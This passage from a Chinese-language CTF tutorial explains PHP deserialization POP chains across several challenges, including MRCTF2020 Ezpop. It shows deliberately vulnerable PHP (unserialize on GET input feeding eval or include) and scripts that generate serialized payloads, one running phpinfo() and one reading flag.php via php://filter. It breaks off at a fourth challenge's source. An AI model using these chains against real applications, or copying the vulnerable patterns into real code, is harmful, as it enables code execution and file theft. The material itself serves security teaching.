-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>因为<code>ClassObj</code>属性是<code>protected</code>属性，不能在类外面访问它，所以说我们得在test类里面写一个<code>__construct()</code>来完成这个操作，构造 POP 链</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$ClassObj</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ClassObj</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>evil</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>evil</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>test</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span><span class=line><span class=cl><span class=err>//O%3A4%3A%22test%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
-</span></span></span></code></pre></div><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png 2x" sizes=auto alt=img></a></figure></p><h3 id=例题2level-1 class=headerLink><a href=#%e4%be%8b%e9%a2%982level-1 class=header-mark></a>例题2——Level 1</h3><p>先找链子的头和尾，头部明显是GET传参，尾部是Uwant类中的<code>getshell</code>，然后往上倒推，Uwant类中的<code>__get()</code>中调用了<code>getshell</code>，Show类中的<code>toString</code>调用了<code>__get()</code>，然后Hello类中的<code>__destruct()</code>，而我们GET传参之后会先进入<code>__destruct()</code>，这样子头和尾就连上了，所以说完整的链子就是：</p><p>头 -> Hello::__destruct() -> Show::__toString() -> Uwant::__get() -> Uwant::getshell -> 尾</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hello</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>str</span><span class=o>=</span><span class=nv>$name</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
-</span></span><span class=line><span class=cl>    <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>source</span><span class=o>=</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Show</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
-</span></span><span class=line><span class=cl>    <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>str</span><span class=p>[</span><span class=s1>&#39;str&#39;</span><span class=p>]</span><span class=o>-&gt;</span><span class=na>source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$content</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Uwant</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$params</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>params</span><span class=o>=</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$key</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getshell</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>params</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getshell</span><span class=p>(</span><span class=nv>$value</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>params</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
-</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>在Hello类中我们要把<code>$this->str</code>赋值成对象，下面<code>echo</code>出来才能调用Show类中的<code>__toString()</code>，然后再把Show类中的<code>$this->str['str']</code>赋值成对象，来调用Uwant类中的<code>__get()</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hello</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Show</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Uwant</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$params</span><span class=o>=</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Hello</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Show</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uwant</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>-&gt;</span> <span class=na>str</span> <span class=o>=</span> <span class=nv>$b</span><span class=p>;</span>            <span class=c1>// Hello.str = new Show()
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$b</span> <span class=o>-&gt;</span> <span class=na>str</span><span class=p>[</span><span class=s1>&#39;str&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$c</span><span class=p>;</span>     <span class=c1>// Show.str[&#39;str&#39;] = new Uwant()
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
-</span></span></code></pre></div><h3 id=例题3mrctf2020ezpop class=headerLink><a href=#%e4%be%8b%e9%a2%983mrctf2020ezpop class=header-mark></a>例题3——[MRCTF2020]Ezpop</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Modifier</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$var</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>append</span><span class=p>(</span><span class=nv>$value</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>        <span class=k>include</span><span class=p>(</span><span class=nv>$value</span><span class=p>);</span>           <span class=c1>// 5.尾部
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>append</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span><span class=p>);</span>  <span class=c1>// 5.调用 append
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Show</span><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$file</span><span class=o>=</span><span class=s1>&#39;index.php&#39;</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>source</span> <span class=o>=</span> <span class=nv>$file</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;Welcome to &#39;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>source</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>   <span class=c1>// 3.preg_match时调用，调用 __get
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>str</span><span class=o>-&gt;</span><span class=na>source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>     <span class=c1>// 2.反序列化之后最先进入 __wakeup
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>source</span><span class=p>))</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>          <span class=c1>// __toString 需要将类的对象当作字符串处理，只要 preg_match 认为 source 是一个类的对象，假如这里成功赋值为对象，那么将调用的是这个作为值的对象的 __toString
-</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>echo</span> <span class=s2>&#34;hacker&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>source</span> <span class=o>=</span> <span class=s2>&#34;index.php&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$p</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>p</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$key</span><span class=p>){</span>    <span class=c1>// 4.访问不存在对象时调用
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$function</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>p</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$function</span><span class=p>();</span>          <span class=c1>// 调用 Modifier 类中的 __invoke
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;pop&#39;</span><span class=p>])){</span>
-</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;pop&#39;</span><span class=p>]);</span>       <span class=c1>// 1.头部
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Show</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>思路分析：仍然是先找链子的头和尾，头部依然是一个<code>GET</code>传参，而尾部在<code>Modifier</code>类中的<code>append()</code>方法中，因为里面有个<code>include</code>可以完成任意文件包含，那我们很容易就可以想到用伪协议来读文件，找到尾部之后往前倒推，在<code>Modifier</code>类中的<code>__invoke()</code>调用了<code>append()</code>，然后在<code>Test</code>类中的<code>__get()</code>返回的是<code>$function()</code>，可以调用<code>__invoke()</code>，再往前<code>Show</code>类中的<code>__toString()</code>可以调用<code>__get()</code>，然后在<code>Show</code>类中的<code>__wakeup()</code>中有一个正则匹配，可以调用<code>__toString()</code>，然后当我们传入字符串，反序列化之后最先进入的就是<code>__wakeup()</code>，这样子头和尾就连上了</p><p>头 -> Show::__wakeup() -> Show::__toString() -> Test::__get() -> Modifier::__invoke() -> Modifier::append -> 尾</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png 2x" sizes=auto alt=img></a></figure></p><p>POP链：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Modifier</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$var</span> <span class=o>=</span> <span class=s1>&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Show</span><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$source</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$str</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$p</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Show</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Show</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Test</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$d</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Modifier</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>-&gt;</span> <span class=na>source</span> <span class=o>=</span> <span class=nv>$b</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>-&gt;</span> <span class=na>str</span> <span class=o>=</span> <span class=nv>$c</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>-&gt;</span> <span class=na>p</span> <span class=o>=</span> <span class=nv>$d</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
-</span></span></code></pre></div><h3 id=例题42021-强网杯-赌徒 class=headerLink><a href=#%e4%be%8b%e9%a2%9842021-%e5%bc%ba%e7%bd%91%e6%9d%af-%e8%b5%8c%e5%be%92 class=header-mark></a>例题4——2021 强网杯 赌徒</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>charset</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=o>&gt;</span>
-</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=c1>//hint is in hint.php
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Start</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;guest&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=o>=</span><span class=s1>&#39;syst3m(&#34;cat 127.0.0.1/etc/hint&#34;);&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;I think you need /etc/hint . Before this you need to see the source code&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>_sayhello</span><span class=p>(){</span>             <span class=c1>// 3.调用 __toString
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;ok&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>     <span class=c1>// 2.反序列化后马上 __wakeup，调用 __sayhello
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;hi&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_sayhello</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$cc</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;give you flag : &#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>flag</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Info</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$phonenumber</span><span class=o>=</span><span class=mi>123123</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$promise</span><span class=o>=</span><span class=s1>&#39;I do&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>promise</span><span class=o>=</span><span class=s1>&#39;I will not !!!!&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>promise</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>                    <span class=c1>// 4. __get 中有不存在的属性，调用 __get
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]</span><span class=o>-&gt;</span><span class=na>ffiillee</span><span class=p>[</span><span class=s1>&#39;ffiilleennaammee&#39;</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Room</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filename</span><span class=o>=</span><span class=s1>&#39;/flag&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$sth_to_set</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>                      <span class=c1>// 5.调用 __invoke
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$function</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$function</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>	
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>Get_hint</span><span class=p>(</span><span class=nv>$file</span><span class=p>){</span>                    <span class=c1>//7.尾，文件读取
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$hint</span><span class=o>=</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$hint</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>                       <span class=c1>// 6.调用 Get_hint
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Get_hint</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$content</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hello&#39;</span><span class=p>])){</span>
-</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;hello&#39;</span><span class=p>]);</span>    <span class=c1>// 1.头
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span><span class=k>else</span><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nv>$hi</span> <span class=o>=</span> <span class=k>new</span>  <span class=nx>Start</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
